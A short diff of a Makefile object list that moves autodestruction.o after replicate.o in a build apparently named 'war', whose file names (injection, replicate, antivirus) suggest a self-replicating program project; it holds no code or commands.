@@ -35,8 +35,8 @@ OBJ_NAME_WAR		= antivirus.o						\
 			  note.o						\
 			  header.o						\
 			  injection.o						\
-			  autodestruction.o					\
 			  replicate.o						\
+			  autodestruction.o					\
 			  execution.o						\
 
 OBJ_NAME_LIB_C		= syscall.o						\
